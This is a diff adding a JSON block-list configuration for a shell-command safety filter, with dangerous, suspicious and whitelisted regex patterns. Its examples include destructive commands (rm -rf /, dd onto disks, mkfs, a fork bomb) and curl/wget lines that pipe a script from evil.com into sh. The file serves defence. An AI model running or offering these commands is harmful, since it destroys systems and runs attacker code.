@@ -1,0 +1,229 @@
+{
+  "version": "1.0.0",
+  "dangerous_patterns": {
+    "description": "Commands that will be BLOCKED by default",
+    "patterns": [
+      {
+        "name": "delete_root_filesystem",
+        "pattern": "^rm\\s+-rf\\s+\\/$",
+        "description": "Delete root filesystem",
+        "severity": "critical",
+        "enabled": true,
+        "examples": [
+          "rm -rf /"
+        ]
+      },
+      {
+        "name": "disk_write_operations",
+        "pattern": "^dd\\s+if=.*of=\\/dev\\/sd",
+        "description": "Direct disk write operations",
+        "severity": "critical",
+        "enabled": true,
+        "examples": [
+          "dd if=/dev/zero of=/dev/sda"
+        ]
+      },
+      {
+        "name": "format_filesystem",
+        "pattern": "^mkfs",
+        "description": "Format filesystem commands",
+        "severity": "critical",
+        "enabled": true,
+        "examples": [
+          "mkfs.ext4 /dev/sda1",
+          "mkfs.xfs /dev/sdb"
+        ]
+      },
+      {
+        "name": "fork_bomb",
+        "pattern": "^:\\(\\){ :\\|:\\& };:",
+        "description": "Fork bomb - creates infinite processes",
+        "severity": "critical",
+        "enabled": true,
+        "examples": [
+          ":(){ :|:& };:"
+        ]
+      },
+      {
+        "name": "chmod_777_root",
+        "pattern": "^chmod\\s+-R\\s+777\\s+\\/",
+        "description": "Recursive chmod 777 on root directory",
+        "severity": "critical",
+        "enabled": true,
+        "examples": [
+          "chmod -R 777 /"
+        ]
+      },
+      {
+        "name": "curl_pipe_to_shell",
+        "pattern": "^curl.*\\|\\s*sh",
+        "description": "Download and execute script via curl",
+        "severity": "high",
+        "enabled": true,
+        "examples": [
+          "curl http://evil.com/script.sh | sh"
+        ]
+      },
+      {
+        "name": "wget_pipe_to_shell",
+        "pattern": "^wget.*\\|\\s*sh",
+        "description": "Download and execute script via wget",
+        "severity": "high",
+        "enabled": true,
+        "examples": [
+          "wget -O- http://evil.com/script.sh | sh"
+        ]
+      },
+      {
+        "name": "delete_system_binaries",
+        "pattern": "^rm\\s+-rf?\\s+\\/usr\\/bin",
+        "description": "Delete system binaries",
+        "severity": "critical",
+        "enabled": true,
+        "examples": [
+          "rm -rf /usr/bin"
+        ]
+      },
+      {
+        "name": "delete_boot_partition",
+        "pattern": "^rm\\s+-rf?\\s+\\/boot",
+        "description": "Delete boot partition",
+        "severity": "critical",
+        "enabled": true,
+        "examples": [
+          "rm -rf /boot"
+        ]
+      },
+      {
+        "name": "overwrite_mbr",
+        "pattern": "^dd.*of=\\/dev\\/[sh]d[a-z]$",
+        "description": "Overwrite Master Boot Record",
+        "severity": "critical",
+        "enabled": true,
+        "examples": [
+          "dd if=/dev/zero of=/dev/sda"
+        ]
+      },
+      {
+        "name": "shutdown_system",
+        "pattern": "^(shutdown|reboot|poweroff|halt)",
+        "description": "System shutdown/reboot commands",
+        "severity": "high",
+        "enabled": true,
+        "examples": []
+      }
+    ]
+  },
+  "suspicious_patterns": {
+    "description": "Commands that trigger WARNINGS",
+    "patterns": [
+      {
+        "name": "sudo_with_rm",
+        "pattern": "sudo\\s+rm",
+        "description": "Using sudo with rm command",
+        "severity": "medium",
+        "enabled": true,
+        "examples": [
+          "sudo rm -rf /tmp/test"
+        ]
+      },
+      {
+        "name": "chmod_777",
+        "pattern": "chmod\\s+777",
+        "description": "Setting world-writable permissions",
+        "severity": "medium",
+        "enabled": true,
+        "examples": [
+          "chmod 777 /tmp/file"
+        ]
+      },
+      {
+        "name": "redirect_to_dev_null",
+        "pattern": ">\\s*\\/dev\\/null\\s+2>&1",
+        "description": "Hiding command output",
+        "severity": "low",
+        "enabled": true,
+        "examples": [
+          "command > /dev/null 2>&1"
+        ]
+      },
+      {
+        "name": "base64_decode",
+        "pattern": "base64.*decode",
+        "description": "Base64 decoding (possible obfuscation)",
+        "severity": "low",
+        "enabled": true,
+        "examples": [
+          "echo 'encoded' | base64 --decode"
+        ]
+      },
+      {
+        "name": "disable_firewall",
+        "pattern": "ufw\\s+disable|iptables\\s+-F",
+        "description": "Disabling firewall",
+        "severity": "high",
+        "enabled": true,
+        "examples": [
+          "ufw disable",
+          "iptables -F"
+        ]
+      },
+      {
+        "name": "password_in_command",
+        "pattern": "(password|passwd|pwd)=\\S+",
+        "description": "Password in command line (visible in history)",
+        "severity": "medium",
+        "enabled": true,
+        "examples": [
+          "mysql -u root -pPassword123"
+        ]
+      },
+      {
+        "name": "nohup_background",
+        "pattern": "nohup.*&",
+        "description": "Background process that survives logout",
+        "severity": "low",
+        "enabled": true,
+        "examples": [
+          "nohup ./script.sh &"
+        ]
+      }
+    ]
+  },
+  "whitelisted_patterns": {
+    "description": "Patterns that should NEVER be blocked",
+    "patterns": [
+      {
+        "name": "safe_user_directory_rm",
+        "pattern": "^rm\\s+-rf?\\s+\\/home\\/[^/]+\\/",
+        "description": "Delete within user home directory",
+        "enabled": true,
+        "examples": [
+          "rm -rf /home/user/project"
+        ]
+      },
+      {
+        "name": "safe_tmp_directory",
+        "pattern": "^rm\\s+-rf?\\s+\\/tmp\\/[^/]+",
+        "description": "Delete within /tmp directory",
+        "enabled": true,
+        "examples": [
+          "rm -rf /tmp/tempfile"
+        ]
+      }
+    ]
+  },
+  "custom_patterns": {
+    "description": "User-defined custom patterns",
+    "dangerous": [],
+    "suspicious": [],
+    "whitelisted": []
+  },
+  "settings": {
+    "block_dangerous_by_default": true,
+    "warn_on_suspicious": true,
+    "log_blocked_commands": true,
+    "case_sensitive": false,
+    "allow_whitelist_override": true
+  }
+}
